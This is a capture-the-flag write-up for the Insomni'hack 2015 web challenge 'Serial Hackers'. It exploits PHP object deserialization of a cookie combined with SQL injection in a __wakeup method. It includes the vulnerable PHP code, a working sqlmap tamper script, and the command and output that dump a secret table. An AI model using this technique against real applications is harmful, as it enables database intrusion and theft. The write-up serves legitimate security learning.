# Insomni'hack CTF 2015: Serial Hackers

**Category:** Web
**Solves:** 19
**Description:**

(TODO)

## Write-up

The web application in this challenge allows us to rate and follow our favorite hacker.

When we follow a hacker we note that a cookie containing a serialized PHP object is set. As the source code of the appliction is also available we have a quick look at the correspondig part in the update.php script.

```php
...
  if ($rel==='follow'){
    $r=mysql_query("SELECT * from hackers where handle='$hacker'");
    $row=mysql_fetch_assoc($r);
    $value=new hackers($row);
    setcookie("H4ck3rs",base64_encode(serialize($value)));
    setcookie("Following",$hacker);
  }
...
```

The deserialization part can be found in the index.php file.

```php
...
  <?php
    if(isset($_COOKIE['Following'])){
      $c=unserialize(base64_decode($_COOKIE['H4ck3rs']));
  ?>
  <div class="navbar-right alert alert-success">
      <?php
        echo '<a href="/?hacker=' . $c->get_handle() . '" class="thumbnail">';
...
```

Deserializing an object in PHP will automatically execute the __wakeup() function of that object. Luckily the hackers class is given as well clearly showing the SQL injection vulnerability.

```php
...
  function __wakeup(){
    $row=mysql_query("SELECT * from hackers where handle='$this->handle'");
    $r=mysql_fetch_assoc($row);
    $this->__construct($r);
  }
...
```

To automate the exploitation we can create a simple sqlmap tamper script.

```python
import base64
from phpserialize import serialize, unserialize, phpobject

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replace original payload with a serialized PHPObject
    """

    # original payload is a serialized and base64 encoded PHPObject
    original_payload = "Tzo3OiJoYWNrZXJzIjoxMDp7czoxNToiAGhhY2tlcnMAaGFuZGxlIjtzOjk6Ilplcm8gQ29vbCI7czoxMjoiAGhhY2tlcnMAYWdlIjtzOjI6IjE4IjtzOjE0OiIAaGFja2VycwBxdW90ZSI7czozNzoiTWVzcyB3aXRoIHRoZSBiZXN0LCBEaWUgbGlrZSB0aGUgcmVzdCI7czoxNDoiAGhhY2tlcnMAcGhvdG8iO3M6MTU6ImltYWdlcy96ZXJvLnBuZyI7czoxMzoiAGhhY2tlcnMAbGlrZSI7czozOiIzMzIiO3M6MTQ6IgBoYWNrZXJzAGRsaWtlIjtzOjE6IjkiO3M6MTI6IgBoYWNrZXJzAHdlYiI7czoyOiI0MCI7czoxMjoiAGhhY2tlcnMAcmV2IjtzOjI6IjkwIjtzOjE0OiIAaGFja2VycwBndWVzcyI7czoyOiIzMCI7czoxMzoiAGhhY2tlcnMAYmVlciI7czoyOiIyMCI7fQ=="

    # decode and unserialize the PHPObject
    my_object = unserialize(base64.b64decode(original_payload), object_hook=phpobject)

    # append the payload to our handle
    my_object.__php_vars__['\x00hackers\x00handle'] += payload

    # return the serialized and encoded PHPObject
    return base64.b64encode(serialize(my_object))
```

Running sqlmap with our tamper script and dumping the secret table reveals the flag
```
./sqlmap.py -u "http://serialhackers.insomni.hack/index.php" --cookie="H4ck3rs=; Following=Stan" -p "H4ck3rs" --tamper="tamper_phpobject" --level=3 --risk=1 --threads=1 --time-sec=5 --tables --exclude-sysdbs -o
...
Database: hackers_db
[2 tables]
+---------+
| hackers |
| secret  |
+---------+
...
Database: hackers_db
Table: secret
[1 entry]
+--------------------+
| flag               |
+--------------------+
| INS{S3r14l_k1ll3R} |
+--------------------+
```

## Other write-ups and resources

* [serial_hackers_79022c2579b5ff134338fb696a8196da.zip](serial_hackers_79022c2579b5ff134338fb696a8196da.zip)
